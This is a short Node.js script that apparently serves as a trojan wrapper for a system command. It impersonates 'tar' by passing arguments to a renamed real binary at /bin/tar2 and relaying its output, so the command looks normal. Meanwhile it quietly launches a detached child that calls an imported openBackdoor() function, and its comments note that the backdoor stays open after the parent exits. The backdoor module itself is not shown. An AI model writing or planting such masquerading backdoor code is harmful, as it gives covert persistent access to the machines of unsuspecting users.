#!/usr/bin/env node
import { spawn } from "child_process";
import openBackdoor from "./backdoor";
import path from "path";

const args = process.argv.slice(2);
let execName = path.basename(process.argv[1]);
if (execName == "client.js") {
  // Default to tar emulation
  execName = "tar";
}

const exec_redirect = `/bin/${execName}2`;

if (args.includes("--interactive")) {
  openBackdoor();
} else {
  // First, simulate tar functionality
  const childProcess = spawn(exec_redirect, args, { argv0: execName });

  childProcess.stdout.on("data", (data) => {
    process.stdout.write(data);
  });

  childProcess.stderr.on("data", (data) => {
    process.stderr.write(`${data}`);
  });

  // Then spawn a child of the same executable, but only with the interactive flag
  const child = spawn(process.argv[0], [process.argv[1], "--interactive"], {
    detached: true,
    stdio: "ignore",
  });
  // allow parent to halt while backdoor remains open
  child.unref();
}
